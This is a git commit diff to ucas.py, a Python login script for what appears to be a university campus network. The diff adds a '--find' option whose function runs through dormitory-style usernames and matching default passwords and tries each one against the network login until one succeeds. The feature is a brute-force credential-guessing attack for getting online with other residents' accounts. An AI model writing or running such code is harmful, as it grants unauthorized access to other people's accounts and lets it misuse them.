8f635bbafc555714da940ce64f4b7671451335bd
renfliu <sdlrf@qq.com>
2017-10-04 13:26:50 +0800

    添加自动寻找账号

--- ucas.py
+++ ucas.py
@@ -31,8 +31,10 @@ def login(username, password):
             print(loginResult['message'])
         elif loginResult['result'] == 'success':
             print('网络登录成功！')
+            return True
         else:
             print('未知错误！') 
+    return False
 
 
 def logout():
@@ -51,6 +53,20 @@ def print_usage():
     print("            login to ucas network")
     print("    -o, --logout")
     print("            logout from ucas network")
+    print("    -f, --find")
+    print("            find a user automatically")
+
+
+def find():
+    for floor in range(1, 8):
+        for room in range(1, 15):
+            for ab in {'a', 'b'}:
+                user = "2{}{:0>2}{}".format(floor, room, ab)
+                password = "2{}{:0>2}".format(floor, room)
+                print("user:" + user + " pass:" + password)
+                if login(user, password):
+                    return True
+    return False
 
 
 if __name__ == '__main__':
@@ -61,6 +77,8 @@ if __name__ == '__main__':
         login(sys.argv[2], sys.argv[3])
     elif sys.argv[1] == '--logout' or sys.argv[1] == '-o':
         logout()
+    elif sys.argv[1] == '--find' or sys.argv[1] == '-f':
+        find()
     else:
         print("参数错误!")
         print_usage()
